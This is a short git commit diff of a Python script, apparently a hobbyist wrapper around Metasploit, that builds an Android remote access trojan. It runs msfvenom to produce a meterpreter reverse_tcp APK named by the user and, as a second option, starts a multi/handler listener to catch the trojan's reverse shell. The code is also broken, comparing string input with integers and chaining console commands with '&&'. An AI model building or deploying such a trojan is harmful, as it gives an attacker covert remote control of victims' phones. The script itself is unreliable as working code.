00d86e93e602e6f81dfa3bc0b62a6a11880e937d
mahdiyar2009 <94992001+mahdiyar2009@users.noreply.github.com>
2021-11-24 22:39:58 +0330

    Update b.py

--- b.py
+++ b.py
@@ -2,7 +2,11 @@ import os
 
 
 
+input_ = input("please enter option: ")
 
+if input_ == 1:
+    name_of_RAT = input("please enter RAT name: ")
+    os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4040 R> /sdcard/{name_of_RAT}.apk")
 
-name_of_RAT = input("please enter RAT name: ")
-os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4040 R> /sdcard/{name_of_RAT}.apk")
+if input_ == 2:
+    os.system("msfconsole && use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost 127.0.0.1 && set lport 4040 && exploit")
